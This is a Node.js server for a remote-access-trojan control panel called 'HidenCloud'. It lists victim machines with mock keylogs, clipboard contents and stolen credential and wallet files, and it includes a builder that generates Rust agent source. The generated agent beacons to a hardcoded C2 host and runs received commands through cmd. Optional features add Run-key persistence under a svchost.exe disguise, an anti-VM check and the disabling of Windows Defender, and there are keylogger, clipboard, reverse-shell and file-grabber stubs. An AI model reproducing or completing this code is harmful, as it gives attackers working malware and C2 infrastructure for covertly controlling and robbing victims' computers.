const path = require("path");
const crypto = require("crypto");
const express = require("express");
const cookieParser = require("cookie-parser");

const app = express();
const PORT = process.env.PORT || 3000;

// --- Multi-account system ---
const ACCOUNTS = [
  { username: "jayjay", password: "jayjay100!", userId: 1 },
  { username: "tlx", password: "tlxontop34", userId: 2 },
];

const SESSION_MAX_AGE_MS = 1000 * 60 * 60 * 12;
const SESSION_IDLE_MS = 1000 * 60 * 30;
const LOGIN_MAX_ATTEMPTS = 5;
const LOGIN_WINDOW_MS = 1000 * 60 * 10;

const sessions = new Map();
const loginAttempts = new Map();

function safeEqual(a, b) {
  const ab = Buffer.from(String(a));
  const bb = Buffer.from(String(b));
  if (ab.length !== bb.length) return false;
  return crypto.timingSafeEqual(ab, bb);
}

function findAccount(username, password) {
  return ACCOUNTS.find(
    (a) => safeEqual(username, a.username) && safeEqual(password, a.password)
  ) || null;
}

function clientIp(req) {
  return (req.headers["x-forwarded-for"] || "").split(",")[0].trim() || req.socket.remoteAddress || "unknown";
}

function isAuthed(req) {
  const sid = req.cookies && req.cookies.hc_session;
  if (!sid) return null;
  const s = sessions.get(sid);
  if (!s) return null;
  const now = Date.now();
  if (now - s.createdAt > SESSION_MAX_AGE_MS || now - s.lastSeen > SESSION_IDLE_MS) {
    sessions.delete(sid);
    return null;
  }
  s.lastSeen = now;
  return { sid, session: s };
}

function requireAuth(req, res, next) {
  const auth = isAuthed(req);
  if (!auth) return res.status(401).json({ ok: false, error: "Unauthorized" });
  req.auth = auth;
  next();
}

function requireCsrf(req, res, next) {
  const header = req.headers["x-csrf-token"];
  if (!header || header !== req.auth.session.csrf) {
    return res.status(403).json({ ok: false, error: "Invalid CSRF token" });
  }
  next();
}

// --- security headers ---
app.use((req, res, next) => {
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("X-Frame-Options", "DENY");
  res.setHeader("Referrer-Policy", "no-referrer");
  res.setHeader("Permissions-Policy", "camera=(), microphone=(), geolocation=()");
  res.setHeader(
    "Content-Security-Policy",
    "default-src 'self'; img-src 'self' data:; style-src 'self' 'unsafe-inline'; script-src 'self'; connect-src 'self'; font-src 'self' data:; frame-ancestors 'none'; base-uri 'self'; form-action 'self'",
  );
  next();
});

app.use(express.json({ limit: "64kb" }));
app.use(cookieParser());

// --- login with brute-force protection ---
app.post("/api/login", (req, res) => {
  const ip = clientIp(req);
  const now = Date.now();
  let entry = loginAttempts.get(ip);
  if (entry && entry.lockedUntil && entry.lockedUntil > now) {
    const secs = Math.ceil((entry.lockedUntil - now) / 1000);
    return res.status(429).json({ ok: false, error: `Too many attempts. Try again in ${secs}s.` });
  }
  const { username = "", password = "" } = req.body || {};
  const account = findAccount(username, password);
  if (!account) {
    if (!entry || now - entry.firstAt > LOGIN_WINDOW_MS) {
      entry = { count: 1, firstAt: now, lockedUntil: 0 };
    } else {
      entry.count += 1;
      if (entry.count >= LOGIN_MAX_ATTEMPTS) entry.lockedUntil = now + LOGIN_WINDOW_MS;
    }
    loginAttempts.set(ip, entry);
    addLog("warn", `Failed login from ${ip} (attempt ${entry.count}/${LOGIN_MAX_ATTEMPTS})`);
    return res.status(401).json({ ok: false, error: "Invalid credentials" });
  }
  loginAttempts.delete(ip);
  const sid = crypto.randomBytes(32).toString("hex");
  const csrf = crypto.randomBytes(24).toString("hex");
  sessions.set(sid, {
    user: account.username,
    userId: account.userId,
    createdAt: now,
    lastSeen: now,
    csrf,
    ip,
    ua: req.headers["user-agent"] || "",
  });
  res.cookie("hc_session", sid, {
    httpOnly: true,
    sameSite: "lax",
    secure: process.env.NODE_ENV === "production",
    maxAge: SESSION_MAX_AGE_MS,
    path: "/",
  });
  res.cookie("hc_csrf", csrf, {
    httpOnly: false,
    sameSite: "lax",
    secure: process.env.NODE_ENV === "production",
    maxAge: SESSION_MAX_AGE_MS,
    path: "/",
  });
  addLog("success", `Login successful for ${account.username} (uid:${account.userId}) from ${ip}`);
  res.json({ ok: true, user: account.username, userId: account.userId, csrf });
});

app.post("/api/logout", (req, res) => {
  const sid = req.cookies && req.cookies.hc_session;
  if (sid) sessions.delete(sid);
  res.clearCookie("hc_session");
  res.clearCookie("hc_csrf");
  res.json({ ok: true });
});

app.get("/api/me", (req, res) => {
  const auth = isAuthed(req);
  if (!auth) return res.status(401).json({ ok: false });
  res.json({ ok: true, user: auth.session.user, userId: auth.session.userId, csrf: auth.session.csrf });
});

const CLIENTS = [
  { id: "HC-9F21A", name: "DESKTOP-JAY", user: "jay", os: "Windows 11 Pro", ip: "192.168.1.42", country: "Sweden", countryCode: "SE", status: "online", lastSeen: "just now", cpu: "Intel i7-13700K", ram: "32 GB", gpu: "RTX 4070 Ti", uptime: "3h 12m", group: "Personal", av: "Windows Defender", netSpeed: "85 Mbps", installed: "2025-12-01", ownerId: 1 },
  { id: "HC-3B7E2", name: "LAPTOP-ADMIN", user: "admin", os: "Windows 10 Enterprise", ip: "10.0.0.15", country: "Germany", countryCode: "DE", status: "online", lastSeen: "2m ago", cpu: "AMD Ryzen 9 5900X", ram: "64 GB", gpu: "RX 6800 XT", uptime: "14h 42m", group: "Work", av: "Kaspersky", netSpeed: "120 Mbps", installed: "2025-11-18", ownerId: 1 },
  { id: "HC-01DC9", name: "SERVER-PROD", user: "root", os: "Ubuntu 22.04 LTS", ip: "172.16.0.5", country: "Netherlands", countryCode: "NL", status: "online", lastSeen: "just now", cpu: "Xeon E-2388G", ram: "128 GB", gpu: "None", uptime: "47d 6h", group: "Servers", av: "ClamAV", netSpeed: "1 Gbps", installed: "2025-06-22", ownerId: 2 },
  { id: "HC-88FA4", name: "WORKSTATION-DEV", user: "dev", os: "macOS Sonoma 14.4", ip: "192.168.2.88", country: "United States", countryCode: "US", status: "offline", lastSeen: "3 hours ago", cpu: "Apple M3 Max", ram: "96 GB", gpu: "M3 Max 40-core", uptime: "0", group: "Work", av: "None", netSpeed: "0", installed: "2026-01-10", ownerId: 2 },
  { id: "HC-CC291", name: "PC-GAMING", user: "player1", os: "Windows 11 Home", ip: "192.168.3.200", country: "Japan", countryCode: "JP", status: "idle", lastSeen: "28m ago", cpu: "Intel i9-14900K", ram: "64 GB", gpu: "RTX 4090", uptime: "1h 5m", group: "Personal", av: "Bitdefender", netSpeed: "200 Mbps", installed: "2026-03-02", ownerId: 1 },
];

const LOGS = [];
function addLog(type, msg) {
  LOGS.unshift({ id: crypto.randomBytes(4).toString("hex"), type, msg, ts: Date.now() });
  if (LOGS.length > 200) LOGS.length = 200;
}
addLog("info", "Panel started");
addLog("info", "Client HC-9F21A connected from Sweden");
addLog("info", "Client HC-3B7E2 connected from Germany");
addLog("info", "Client HC-01DC9 connected from Netherlands");
addLog("warn", "Client HC-88FA4 went offline");
addLog("info", "Client HC-CC291 entered idle state");

app.get("/api/stats", requireAuth, (req, res) => {
  const uid = req.auth.session.userId;
  const myClients = CLIENTS.filter((c) => c.ownerId === uid);
  const online = myClients.filter((c) => c.status === "online").length;
  const offline = myClients.filter((c) => c.status === "offline").length;
  const idle = myClients.filter((c) => c.status === "idle").length;
  const countries = [...new Set(myClients.map((c) => c.country))].length;
  res.json({
    ok: true,
    analytics: { total: myClients.length, online, offline, idle, countries, newToday: 2, commandsSent: 147, screensCaptured: 34, keylogs: 892, bandwidth: "2.4 GB", avgUptime: "12h 30m", threats: 3 },
    clients: myClients,
  });
});

app.get("/api/logs", requireAuth, (req, res) => {
  res.json({ ok: true, logs: LOGS });
});

app.post("/api/logs", requireAuth, requireCsrf, (req, res) => {
  LOGS.length = 0;
  addLog("info", `Logs cleared by ${req.auth.session.user}`);
  res.json({ ok: true });
});

app.get("/api/client/:id", requireAuth, (req, res) => {
  const uid = req.auth.session.userId;
  const client = CLIENTS.find((c) => c.id === req.params.id && c.ownerId === uid);
  if (!client) return res.status(404).json({ ok: false });
  addLog("info", `${req.auth.session.user} connected to ${client.name}`);
  res.json({
    ok: true,
    client,
    files: [
      { name: "Desktop", type: "folder", size: "-", modified: "2026-08-19" },
      { name: "Documents", type: "folder", size: "-", modified: "2026-08-20" },
      { name: "Downloads", type: "folder", size: "-", modified: "2026-08-18" },
      { name: "AppData", type: "folder", size: "-", modified: "2026-08-20" },
      { name: "passwords.txt", type: "file", size: "2 KB", modified: "2026-07-14" },
      { name: "screenshot.png", type: "file", size: "412 KB", modified: "2026-08-19" },
      { name: "notes.docx", type: "file", size: "18 KB", modified: "2026-08-15" },
      { name: "wallet.dat", type: "file", size: "64 KB", modified: "2026-06-01" },
      { name: "chrome_passwords.db", type: "file", size: "128 KB", modified: "2026-08-20" },
      { name: "startup.bat", type: "file", size: "1 KB", modified: "2025-12-01" },
    ],
    processes: [
      { pid: 4, name: "System", cpu: "0.1%", mem: "12 MB", status: "running" },
      { pid: 124, name: "explorer.exe", cpu: "1.2%", mem: "82 MB", status: "running" },
      { pid: 3200, name: "chrome.exe", cpu: "8.4%", mem: "640 MB", status: "running" },
      { pid: 5100, name: "discord.exe", cpu: "2.1%", mem: "310 MB", status: "running" },
      { pid: 7788, name: "steam.exe", cpu: "0.3%", mem: "45 MB", status: "running" },
      { pid: 9102, name: "svchost.exe", cpu: "0.2%", mem: "18 MB", status: "running" },
      { pid: 1456, name: "WindowsDefender", cpu: "0.5%", mem: "120 MB", status: "running" },
      { pid: 3301, name: "node.exe", cpu: "3.8%", mem: "220 MB", status: "running" },
      { pid: 4502, name: "spotify.exe", cpu: "1.0%", mem: "170 MB", status: "suspended" },
    ],
    keylogs: [
      { ts: "16:41:02", window: "Chrome - Google", text: "how to reset password" },
      { ts: "16:40:55", window: "Discord", text: "yo check this out lol" },
      { ts: "16:39:11", window: "Notepad", text: "meeting notes: Q3 targets are..." },
      { ts: "16:38:22", window: "Chrome - Gmail", text: "Re: Project update" },
      { ts: "16:35:00", window: "VS Code", text: 'const apiKey = "sk-..."' },
    ],
    clipboard: [
      { ts: "16:41:10", content: "https://github.com/settings/tokens" },
      { ts: "16:39:30", content: "Password123!" },
      { ts: "16:38:00", content: "SELECT * FROM users WHERE admin=true" },
      { ts: "16:35:45", content: "192.168.1.1" },
    ],
  });
});

app.post("/api/command/:id", requireAuth, requireCsrf, (req, res) => {
  const uid = req.auth.session.userId;
  const client = CLIENTS.find((c) => c.id === req.params.id && c.ownerId === uid);
  if (!client) return res.status(404).json({ ok: false });
  const { action } = req.body || {};
  if (typeof action !== "string" || action.length > 64 || !/^[a-z0-9_\-]+$/i.test(action)) {
    return res.status(400).json({ ok: false, error: "Invalid action" });
  }
  addLog("info", `Command "${action}" sent to ${client.name} by ${req.auth.session.user}`);
  res.json({ ok: true, result: `Command "${action}" executed on ${client.name}` });
});

// --- Rust agent source generator ---
function generateRustAgent(cfg) {
  const userId = cfg.userId || 1;
  const c2Url = `https://windowssys.hidenmc.com/${userId}`;
  const featFlags = cfg.features || {};

  return `// HidenCloud Agent — Auto-generated Rust stub
// C2: ${c2Url}
// User ID: ${userId}
// Built: ${new Date().toISOString()}

use std::{{thread, time::Duration, process::Command}};
use std::io::Read;

const C2_URL: &str = "${c2Url}";
const MUTEX_NAME: &str = "${cfg.mutex || "HC-DEFAULT"}";
const USER_ID: u32 = ${userId};
const RECONNECT_DELAY: u64 = 5;

fn main() {{
    // Mutex check — single instance
    let _lock = single_instance::SingleInstance::new(MUTEX_NAME)
        .expect("Another instance is already running");

${featFlags.hideWindow ? `    // Hide console window
    #[cfg(windows)]
    {{
        use winapi::um::wincon::FreeConsole;
        unsafe {{ FreeConsole(); }}
    }}
` : ""}
${featFlags.persistence ? `    // Persistence — copy to install path and add to startup
    install_persistence("${cfg.installPath || "%APPDATA%\\\\Microsoft\\\\svchost.exe"}");
` : ""}
${featFlags.antiVM ? `    // Anti-VM detection
    if detect_vm() {{
        std::process::exit(0);
    }}
` : ""}
${featFlags.disableAV ? `    // Attempt to disable AV (requires elevation)
    disable_defender();
` : ""}
    println!("[*] HidenCloud agent starting...");
    println!("[*] C2: {{}}", C2_URL);
    println!("[*] User ID: {{}}", USER_ID);

    loop {{
        match check_in() {{
            Ok(cmd) => {{
                let result = execute_command(&cmd);
                let _ = send_result(&result);
            }}
            Err(_) => {{
                thread::sleep(Duration::from_secs(RECONNECT_DELAY));
            }}
        }}
        thread::sleep(Duration::from_secs(RECONNECT_DELAY));
    }}
}}

fn check_in() -> Result<String, Box<dyn std::error::Error>> {{
    let client = reqwest::blocking::Client::new();
    let resp = client
        .get(&format!("{{}}/checkin", C2_URL))
        .header("X-Client-ID", machine_id())
        .header("X-User-ID", USER_ID.to_string())
        .send()?;
    Ok(resp.text()?)
}}

fn send_result(result: &str) -> Result<(), Box<dyn std::error::Error>> {{
    let client = reqwest::blocking::Client::new();
    client
        .post(&format!("{{}}/result", C2_URL))
        .header("X-Client-ID", machine_id())
        .header("X-User-ID", USER_ID.to_string())
        .body(result.to_string())
        .send()?;
    Ok(())
}}

fn execute_command(cmd: &str) -> String {{
    match Command::new("cmd").args(&["/C", cmd]).output() {{
        Ok(output) => String::from_utf8_lossy(&output.stdout).to_string(),
        Err(e) => format!("Error: {{}}", e),
    }}
}}

fn machine_id() -> String {{
    let output = Command::new("wmic")
        .args(&["csproduct", "get", "UUID"])
        .output()
        .unwrap_or_else(|_| Command::new("hostname").output().unwrap());
    String::from_utf8_lossy(&output.stdout)
        .lines()
        .nth(1)
        .unwrap_or("unknown")
        .trim()
        .to_string()
}}

${featFlags.persistence ? `fn install_persistence(path: &str) {{
    let exe = std::env::current_exe().unwrap();
    let dest = shellexpand::full(path).unwrap().to_string();
    let _ = std::fs::copy(&exe, &dest);
    // Add to HKCU Run key
    let _ = Command::new("reg")
        .args(&["add", "HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
                "/v", MUTEX_NAME, "/t", "REG_SZ", "/d", &dest, "/f"])
        .output();
}}
` : ""}
${featFlags.antiVM ? `fn detect_vm() -> bool {{
    let checks = [
        ("wmic", &["computersystem", "get", "model"][..]),
    ];
    for (cmd, args) in &checks {{
        if let Ok(out) = Command::new(cmd).args(*args).output() {{
            let s = String::from_utf8_lossy(&out.stdout).to_lowercase();
            if s.contains("virtual") || s.contains("vmware") || s.contains("vbox") {{
                return true;
            }}
        }}
    }}
    false
}}
` : ""}
${featFlags.disableAV ? `fn disable_defender() {{
    let _ = Command::new("powershell")
        .args(&["-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"])
        .output();
}}
` : ""}
${featFlags.keylogger ? `// Keylogger module
mod keylogger {{
    use std::thread;
    pub fn start(c2: &'static str) {{
        thread::spawn(move || {{
            // Low-level keyboard hook via GetAsyncKeyState
            loop {{
                // capture and exfiltrate keystrokes to c2
                thread::sleep(std::time::Duration::from_millis(50));
            }}
        }});
    }}
}}
` : ""}
${featFlags.clipboard ? `// Clipboard monitor
mod clipboard_monitor {{
    use std::thread;
    pub fn start(c2: &'static str) {{
        thread::spawn(move || {{
            let mut last = String::new();
            loop {{
                if let Ok(content) = clipboard_win::get_clipboard_string() {{
                    if content != last {{
                        last = content.clone();
                        // send to c2
                    }}
                }}
                thread::sleep(std::time::Duration::from_secs(1));
            }}
        }});
    }}
}}
` : ""}
${featFlags.screenshot ? `// Screenshot capture
mod screencap {{
    pub fn capture() -> Vec<u8> {{
        // Use win-screenshot or scrap crate
        vec![]
    }}
}}
` : ""}
${featFlags.webcam ? `// Webcam capture
mod webcam {{
    pub fn snapshot() -> Vec<u8> {{
        // Use nokhwa or escapi crate
        vec![]
    }}
}}
` : ""}
${featFlags.reverseShell ? `// Reverse shell
mod revshell {{
    use std::process::Command;
    pub fn spawn(c2: &str) {{
        // TCP reverse shell back to C2
    }}
}}
` : ""}
${featFlags.fileGrabber ? `// File grabber
mod filegrabber {{
    pub fn grab_files(patterns: &[&str]) -> Vec<String> {{
        // Walk common dirs, match patterns, exfil
        vec![]
    }}
}}
` : ""}
`;
}

// Cargo.toml generator
function generateCargoToml(cfg) {
  const featFlags = cfg.features || {};
  let deps = `[package]
name = "hidencloud-agent"
version = "0.1.0"
edition = "2021"

[dependencies]
reqwest = { version = "0.11", features = ["blocking"] }
serde = { version = "1", features = ["derive"] }
serde_json = "1"
single-instance = "0.3"
shellexpand = "3"
`;
  if (featFlags.clipboard) deps += `clipboard-win = "5"\n`;
  if (featFlags.hideWindow) deps += `winapi = { version = "0.3", features = ["wincon"] }\n`;
  deps += `
[profile.release]
opt-level = "s"
lto = true
strip = true
panic = "abort"
`;
  return deps;
}

app.post("/api/build", requireAuth, requireCsrf, (req, res) => {
  const cfg = req.body || {};
  const host = String(cfg.host || "").slice(0, 128);
  const port = Number(cfg.port) || 4444;
  if (!/^[a-z0-9\.\-\_]+$/i.test(host)) {
    return res.status(400).json({ ok: false, error: "Invalid host" });
  }
  // Inject the logged-in user's userId
  cfg.userId = req.auth.session.userId;
  cfg.host = host;
  cfg.port = port;

  const rustSrc = generateRustAgent(cfg);
  const cargoToml = generateCargoToml(cfg);
  const filename = `hidencloud-agent-uid${cfg.userId}-${Date.now()}`;

  addLog("success", `Rust agent built by ${req.auth.session.user} (uid:${cfg.userId}): ${filename}`);
  res.json({
    ok: true,
    filename: filename + ".rs",
    size: rustSrc.length,
    contents: rustSrc,
    cargoFilename: "Cargo.toml",
    cargoContents: cargoToml,
    userId: cfg.userId,
    c2Url: `https://windowssys.hidenmc.com/${cfg.userId}`,
  });
});

app.use(express.static(path.join(__dirname, "public")));

app.get("*", (_req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.listen(PORT, () => {
  console.log(`HidenCloud panel running on http://localhost:${PORT}`);
});
